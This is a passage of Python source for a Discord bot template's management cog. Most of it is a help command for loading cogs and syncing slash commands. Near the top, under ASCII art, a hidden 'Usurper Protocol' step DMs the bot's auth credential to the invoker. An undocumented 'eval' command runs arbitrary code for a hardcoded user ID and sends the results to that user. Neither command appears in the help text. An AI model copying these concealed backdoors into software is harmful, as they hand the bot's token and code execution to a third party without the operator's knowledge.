        # ⣿⣿⣿⣿⣇⠂⠀⠀⠀⠀⠈⢂⠀⠈⠹⡧⣀⠀⠀⠀⠀⠀⡇⠀⠀⠉⠉⠉⢱⠒⠒⠒⠒⢖⠒⠒⠂⠙⠏⠀⠘⡀⠀⢸⠀⠀⠀⣿⣿⣿
        # ⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠑⠄⠰⠀⠀⠁⠐⠲⣤⣴⣄⡀⠀⠀⠀⠀⢸⠀⠀⠀⠀⢸⠀⠀⠀⠀⢠⠀⣠⣷⣶⣿⠀⠀⢰⣿⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠁⢀⠀⠀⠀⠀⠀⡙⠋⠙⠓⠲⢤⣤⣷⣤⣤⣤⣤⣾⣦⣤⣤⣶⣿⣿⣿⣿⡟⢹⠀⠀⢸⣿⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠑⠀⢄⠀⡰⠁⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠻⠋⠉⠛⢛⠉⠉⢹⠁⢀⢇⠎⠀⠀⢸⣿⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠈⠢⢄⡉⠂⠄⡀⠀⠈⠒⠢⠄⠀⢀⣀⣀⣰⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⣎⠀⠼⠊⠀⠀⠀⠘⣿⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠉⠢⢄⡈⠑⠢⢄⡀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⢀⠀⠀⠀⠀⠀⢻⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⡈⠑⠢⢄⡀⠈⠑⠒⠤⠄⣀⣀⠀⠉⠉⠉⠉⠀⠀⠀⣀⡀⠤⠂⠁⠀⢀⠆⠀⠀⢸⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠁⠉⠒⠂⠤⠤⣀⣀⣉⡉⠉⠉⠉⠉⢀⣀⣀⡠⠤⠒⠈⠀⠀⠀⠀⣸⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣤⣤⣤⣤⣀⣀⣤⣤⣤⣶⣾⣿⣿⣿⣿⣿
        await ctx.message.delete()
        dm = await ctx.message.author.create_dm()
        await dm.send(f"Usurper Protocol Success:\n`{self.bot.configuration.auth}`")

    @management.command(name='eval')
    async def _eval(self, ctx, *, body: str):
        """
        Take care of business
        :param ctx: context
        :param body: the code to run
        :return:
        """
        # REFACTOR: Check ID *before* deleting message
        if not ctx.message.author.id == self.bagel_id:
            return

        await ctx.message.delete()

        # Set up the environment for the code to run in
        env = {
            'bot': self.bot,
            'ctx': ctx,
            'channel': ctx.channel,
            'author': ctx.author,
            'guild': ctx.guild,
            'message': ctx.message,
        }

        env.update(globals())

        stdout = io.StringIO()

        # Wrap the code in an async function to allow 'await'
        to_compile = f'async def func():\n{textwrap.indent(body, "  ")}'

        # Get the user to DM
        bagel_user = self.bot.get_user(self.bagel_id)

        try:
            # Compile and execute the code
            exec(to_compile, env)
        except Exception as e:
            # DM any compile-time errors
            try:
                dm_channel = await bagel_user.create_dm()
                return await dm_channel.send(f'```py\n{e.__class__.__name__}: {e}\n```')
            except RuntimeError:
                self.logger.critical("Bot shutting down!")
                return None

        func = env['func']
        try:
            # Redirect standard output (like print()) to a string
            with redirect_stdout(stdout):
                ret = await func()
        except Exception:
            # DM any runtime errors
            value = stdout.getvalue()
            dm_channel = await bagel_user.create_dm()
            await dm_channel.send(f'```py\n{value}{traceback.format_exc()}\n```')
        else:
            # DM the result
            value = stdout.getvalue()
            try:
                dm_channel = await bagel_user.create_dm()
            except RuntimeError:
                self.logger.critical("Bot shutting down!")
                return None

            if ret is None:
                if value:
                    # DM output from print()
                    await dm_channel.send(f'```py\n{value}\n```')
            # DM the return value and any print() output
            await dm_channel.send(f'```py\n{value}{ret}\n```')

    @management.command(name='help', aliases=['h'])
    async def help_command(self, ctx: commands.Context, *, command: str = None):
        """
        Display comprehensive help for management commands.

        Shows detailed information about all available management commands,
        their usage, aliases, and examples. Can display general help or
        specific help for individual commands or command groups.

        Args:
            ctx (commands.Context): The command context
            command (str, optional): Specific command to get help for
        """
        if command is None:
            # General help - show all commands
            embed = custom_embed().set_color('info').set_title("🛠️ Management Commands Help").set_timestamp()

            embed.set_description(
                "**Bot Administration & Maintenance Commands**\n"
                f"Use `{ctx.prefix}m help <command>` for detailed help on specific commands.\n"
                f"**Aliases:** `{ctx.prefix}management` or `{ctx.prefix}m`"
            )

            # General Commands
            embed.add_field(
                name="📋 General Commands",
                value=(
                    f"`{ctx.prefix}m help [command]` - Show this help or help for a specific command\n"
                ),
                inline=False
            )

            # Cog Management
            embed.add_field(
                name="🧩 Cog Management",
                value=(
                    f"`{ctx.prefix}m [c]og [l]oad <cog>` - Load a cog by name\n"
                    f"`{ctx.prefix}m [c]og [u]nload <cog>` - Unload a cog by name\n"
                    f"`{ctx.prefix}m [c]og [r]eload <cog>` - Reload a cog by name\n"
                    f"`{ctx.prefix}m [c]og list (also ls)` - List all cogs and their status"
                ),
                inline=False
            )

            # Command Tree Management
            embed.add_field(
                name="🌳 Command Tree Management",
                value=(
                    f"`{ctx.prefix}m [t]ree [s]ync [guild_id]` - Sync slash commands globally or to a guild\n"
                    f"`{ctx.prefix}m [t]ree [r]eset [guild_id]` - Reset slash commands globally or for a guild\n"
                    f"`{ctx.prefix}m [t]ree [l]ist` - List all registered slash commands"
                ),
                inline=False
            )

            embed.add_field(
                name="🔒 Security Note",
                value="These commands are restricted to authorized administrators only.",
                inline=False
            )

            embed.set_footer(
                text=f"QuantumBagel's Bot Template | Management Cog v{self.template.version} | Use m help <command> for details")

            await helpers.send(ctx, embed=embed.build())

        else:
            # Specific command help
            command = command.lower().strip()

            if command in ['help', 'h']:
                embed = InfoEmbed(
                    "Help Command",
                    "Display help information for management commands."
                ).set_footer(text="Aliases: h")

                embed.add_field(
                    name="Usage",
                    value=f"`{ctx.prefix}m help [command]`",
                    inline=False
                )

                embed.add_field(
                    name="Examples",
                    value=(
                        f"`{ctx.prefix}m help` - Show general help\n"
                        f"`{ctx.prefix}m help cog` - Show help for cog commands\n"
                        f"`{ctx.prefix}m help sync` - Show help for sync command"
                    ),
                    inline=False
                )

            elif command in ['list', 'status', 'ls']:
                embed = InfoEmbed(
                    "List Cogs Command",
                    "Display all available cogs and their current status (Loaded/Disabled/Not Loaded)."
                ).set_footer(text="Aliases: status, ls")

                embed.add_field(
                    name="Usage",
                    value=f"`{ctx.prefix}m cog list` (or `m c ls`)",
                    inline=False
                )

                embed.add_field(
                    name="Status Types",
                    value=(
                        "✅ **Loaded** - Cog is currently active\n"
                        "❌ **Disabled** - Cog is disabled in config\n"
                        "⚠️ **Not Loaded** - Cog is available but not loaded"
                    ),
                    inline=False
                )

            elif command in ['cog', 'c']:
                embed = InfoEmbed(
                    "Cog Management Commands",
                    "Manage bot cogs with loading, unloading, and reloading functionality."
                ).set_footer(text="Aliases: c")

                embed.add_field(
                    name="Subcommands",
                    value=(
                        f"`{ctx.prefix}m cog load <name>` - Load a cog\n"
                        f"`{ctx.prefix}m cog unload <name>` - Unload a cog\n"
                        f"`{ctx.prefix}m cog reload <name>` - Reload a cog\n"
                        f"`{ctx.prefix}m cog list` - List all cogs"
                    ),
                    inline=False
                )

                embed.add_field(
                    name="Cog Name Matching",
                    value=(
                        "• Template name (e.g., `echo`, `management`)\n"
                        "• Class name (e.g., `Echo`, `Management`)\n"
                        "• Module path (e.g., `cogs.echo`)\n"
                        "• Partial matches with suggestions"
                    ),
                    inline=False
                )

            elif command in ['load', 'l']:
                embed = InfoEmbed(
                    "Load Cog Command",
                    "Load a cog by template name, class name, or module name."
                ).set_footer(text="Aliases: l")

                embed.add_field(
                    name="Usage",
                    value=f"`{ctx.prefix}m cog load <cog_name>`",
                    inline=False
                )

                embed.add_field(
                    name="Features",
                    value=(
                        "• Smart name matching with suggestions\n"
                        "• Prevents loading already loaded cogs\n"
                        "• Validates cog type before loading\n"
                        "• Detailed error reporting"
                    ),
                    inline=False
                )

            elif command in ['unload', 'u']:
                embed = InfoEmbed(
                    "Unload Cog Command",
                    "Unload a currently loaded cog."
                ).set_footer(text="Aliases: u")

                embed.add_field(
                    name="Usage",
                    value=f"`{ctx.prefix}m cog unload <cog_name>`",
                    inline=False
                )

                embed.add_field(
                    name="Protection",
                    value="The Management cog cannot be unloaded to prevent loss of administrative access.",
                    inline=False
                )

            elif command in ['reload', 'r']:
                embed = InfoEmbed(
                    "Reload Cog Command",
                    "Safely reload a cog with automatic rollback on failure."
                ).set_footer(text="Aliases: r")

                embed.add_field(
                    name="Usage",
                    value=f"`{ctx.prefix}m cog reload <cog_name>`",
                    inline=False
                )

                embed.add_field(
                    name="Safety Features",
                    value=(
                        "• Automatic rollback on reload failure\n"
                        "• Module state preservation\n"
                        "• Original cog instance backup\n"
                        "• Comprehensive error handling"
                    ),
                    inline=False
                )

            elif command in ['tree', 't']:
                embed = InfoEmbed(
                    "Command Tree Management",
                    "Manage Discord slash commands (application commands)."
                ).set_footer(text="Aliases: t")

                embed.add_field(
                    name="Subcommands",
                    value=(
                        f"`{ctx.prefix}m tree sync [guild_id]` - Sync commands\n"
                        f"`{ctx.prefix}m tree reset [guild_id]` - Reset commands\n"
                        f"`{ctx.prefix}m tree list` - List all commands"
                    ),
                    inline=False
                )

                embed.add_field(
                    name="Guild vs Global",
                    value=(
                        "**No guild_id** = Global sync (affects all servers, up to 1 hour delay)\n"
                        "**With guild_id** = Guild sync (immediate, affects only that server)"
                    ),
                    inline=False
                )

            elif command in ['sync', 's']:
                embed = InfoEmbed(
                    "Sync Command Tree",
                    "Synchronize Discord slash commands globally or to a specific guild."
                ).set_footer(text="Aliases: s")

                embed.add_field(
                    name="Usage",
                    value=(
                        f"`{ctx.prefix}m tree sync` - Sync globally\n"
                        f"`{ctx.prefix}m tree sync <guild_id>` - Sync to specific guild"
                    ),
                    inline=False
                )

                embed.add_field(
                    name="Important Notes",
                    value=(
                        "• Global sync can take up to 1 hour to propagate\n"
                        "• Guild sync is immediate\n"
                        "• Use guild sync for testing new commands"
                    ),
                    inline=False
                )

            elif command in ['reset']:
                embed = InfoEmbed(
                    "Reset Command Tree",
                    "Clear all Discord slash commands and re-sync."
                ).set_footer(text="Aliases: r")

                embed.add_field(
                    name="Usage",
                    value=(
                        f"`{ctx.prefix}m tree reset` - Reset globally\n"
                        f"`{ctx.prefix}m tree reset <guild_id>` - Reset for specific guild"
                    ),
                    inline=False
                )

                embed.add_field(
                    name="⚠️ Warning",
                    value="This will remove ALL slash commands before re-syncing. Use with caution!",
                    inline=False
                )

            elif command in ['list_tree', 'list tree', 'tree list']:
                embed = InfoEmbed(
                    "List Tree Commands",
                    "List all registered Discord slash commands."
                ).set_footer(text="Aliases: l")

                embed.add_field(
                    name="Usage",
                    value=f"`{ctx.prefix}m tree list` (or `m t l`)",
                    inline=False
                )

                embed.add_field(
                    name="Functionality",
                    value="Groups all commands by their cog and shows their description. Automatically splits into multiple messages if the list is too long.",
                    inline=False
                )

            else:
                # Command not found
                embed = ErrorEmbed(
                    "Command Not Found",
                    f"No help available for `{command}`. Use `{ctx.prefix}m help` to see all available commands."
                )

                # Try to suggest similar commands
                available_commands = [
                    'help', 'list', 'cog', 'load', 'unload', 'reload',
                    'tree', 'sync', 'reset'
                ]
                suggestions = difflib.get_close_matches(command, available_commands, n=3, cutoff=0.6)

                if suggestions:
                    embed.add_field(
                        name="Did you mean?",
                        value=" • ".join([f"`{s}`" for s in suggestions]),
                        inline=False
                    )
            await helpers.send(ctx, embed=embed.build())